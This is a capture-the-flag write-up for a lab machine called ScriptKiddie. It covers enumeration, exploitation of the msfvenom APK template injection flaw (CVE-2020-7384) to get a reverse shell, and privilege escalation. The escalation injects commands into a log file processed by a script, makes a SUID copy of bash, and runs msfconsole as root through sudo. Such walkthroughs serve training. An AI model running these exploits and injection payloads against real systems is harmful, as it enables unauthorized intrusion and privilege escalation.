# My solution

Start with usual nmap script to enumerate.  
```
nmap -sC -sV -oN nmap-initial 10.10.10.226
```

We see ssh open, a fitered 903 port and a webserver on 5000.  
We start by looking at port 5000. As we see from the nmap outcome, port 5000 hosts a Werkzeug web application which uses python 3.8.5

Run dirbuster: http://10.10.10.226:5000/, not recursive, extentions: py,html, dictionary medium

Run dirbuster: http://10.10.10.226:5000/, not recursive, extentions: py,html, dictionary dirb big.txt

Run wfuzz to find console entry. Namely
```
wfuzz -u http://10.10.10.226:5000/FUZZ/console -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404
```
No results excepts //console that returns the default page

Ideas:
1. May contain sensitive information ?
http://10.10.10.226:5000/static/hacker.css
2. fuzz url to find console 
e.g. http://10.10.10.226:5000/$FUZZ$/console
3.  Access /console or trigger internal server error to make the console show up
https://medium.com/swlh/hacking-flask-applications-939eae4bffed

The more promising so far is tryng to trigger an internal server error.

### Path 1: Trigger internal state 

1. Change values of os in the payload field  
Since the user is limited to select the values linux,windows or android,  the back end may give the selection of one of this 3 possibilities for granted. We thus try to modify the http payload with Burp, hoping to cause an internal error in the server.  
We tried with names such as 'lll' or also special charachters as \',\",\*. Invalid os is returned by the back end.  
2. Trigger internal state error by using a malformed msfvenom template file  
Did not yield to any results

### Path 2: Command injection in msfvenom template file
While googling for information regarding the template file and msfvenom, we run into the CVE-2020-7384: Malicious user may upload a malicious template file in msfvenom which would trigger code execution on the target machine.  
Metasploit created a module for this vulnerability as we can see from the metasploit github page: https://github.com/rapid7/metasploit-framework/pull/14331.  

We thus use metasploit to exploit the vulnerability (the module is pretty new, so we need to update metasploit if the module is not available)
We select the module (unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) , modify the options and we run the exploit. This will generate the apk file containing our command injection that will be executed by msfvenom on the target machine.  
We start a exploit/multi/handler on our host mahcine and upload the generated apk file in the specific form in the web server. The os which has to be selected is android, the ip can be arbitrary.

Once we press *generate* a reverse shell will be started on the metasploit handler instance.  
The user flag is under /home/kid.  

We now want to escalate the privileges  

We see a scanlosers.sh in the /home/pwn directory that we can read. After a quick analysis of the file it is possible to see that the file /home/kid/logs/hackers is used to retrieve inputs to feed to scanlosers.sh.  
Given that we (as kid) own the the file 'hackers', we may inject some command in the file and hope that it will be executed by the pwn user.  
We can confirm that scanlosers.sh is in action by writing to the 'hackers' file. As we can see, the file get emptied immediately.  
We can easily execute command in scanlosers.sh by using nested commands. Namely
```
echo 'ciao1 ciao2 $(/usr/bin/ping 10.10.14.20)' >> hackers
```
We receive the ping in the host machine, thus confirming the code injection.  
With a better payload:
```
echo 'ciao ciao $(cp /bin/bash /home/pwn/bash; chmod +s /home/pwn/bash)' >> /home/kid/logs/hackers
```

We execute the bash shell with the -p option. The effective user id will be used.
```
./bash -p
```

We are now the user pwn.  
We set up the ssh keys to enter through ssh and have a more stable shell. Since the authorized file is owned by root and we cannot overwrite it, we remove the entire .ssh folder and we create another one. We insert our pub key in the authorized file and we connect through ssh.  

We can then proceed to root the box.  
With  sudo -l we can see that the user pwn can execute msfconsole as root. Again we can use the script kiddie tools against him.  
```
sudo /opt/metasploit-framework-6.0.9/msfconsole
```

We thus get the shell as root
```
msf6 > whoami
[*] exec: whoami

root
```

We can now retrieve the flag in /root/root.txt
